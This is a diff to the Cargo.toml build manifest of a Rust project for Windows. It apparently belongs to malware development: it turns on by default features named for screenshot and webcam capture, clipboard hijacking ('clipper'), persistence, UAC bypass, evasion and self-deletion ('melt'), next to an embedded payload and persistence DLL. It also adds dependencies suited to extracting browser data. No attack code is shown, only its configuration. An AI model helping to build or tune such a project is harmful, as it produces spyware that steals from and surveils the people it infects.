@@ -4,30 +4,38 @@ version = "0.1.0"
 edition = "2024"
 
 [features]
-default = []
+default = ["screenshot", "webcam", "clipboard", "persistence", "uac", "evasion", "clipper", "melt"]
 embedded_payload = []
 embedded_persistence_dll = []
+screenshot = ["dep:image"]
+webcam = ["dep:nokhwa", "dep:image"]
+clipboard = []
+persistence = []
+uac = []
+evasion = []
+clipper = []
+melt = []
 
 [dependencies]
 async-trait = "0.1"
 thiserror = "1.0"
-tokio = { version = "1.45", features = ["rt-multi-thread", "macros", "fs", "io-util", "sync", "process", "net"] }
+tokio = { version = "1.45", default-features = false, features = ["rt", "macros", "fs", "io-util", "sync", "process", "net", "time"] }
 tracing = "0.1"
 tracing-subscriber = { version = "0.3", features = ["fmt", "env-filter"] }
 directories = "5.0"
 serde = { version = "1.0", features = ["derive"] }
 serde_json = "1.0"
-image = { version = "0.25", default-features = false, features = ["png"] }
-nokhwa = { version = "0.10.10", default-features = false, features = ["input-native"] }
+image = { version = "0.25", default-features = false, features = ["png"], optional = true }
+nokhwa = { version = "0.10.10", default-features = false, features = ["input-native"], optional = true }
 aes-gcm = "0.10"
 base64 = "0.21"
 libloading = "0.7"
-regex = "1.11"
+regex = { package = "regex-lite", version = "0.1" }
 winreg = "0.12"
 walkdir = "2.3.3"
 quick-xml = "0.27"
 roxmltree = "0.18"
-reqwest = { version = "0.12", features = ["json", "rustls-tls", "multipart"] }
+# reqwest = { version = "0.12", features = ["json", "rustls-tls", "multipart"] }
 zip = { version = "7.1.0", default-features = false, features = ["aes-crypto", "deflate"] }
 rusqlite = { version = "0.33", features = ["bundled"] }
 aes = "0.8.4"
@@ -67,6 +75,7 @@ features = [
     "Win32_System_Variant",
     "Win32_NetworkManagement_IpHelper",
     "Win32_Networking_WinSock",
+    "Win32_Networking_WinHttp",
     "Win32_NetworkManagement_Ndis",
     "Win32_UI_Input_KeyboardAndMouse",
 ]
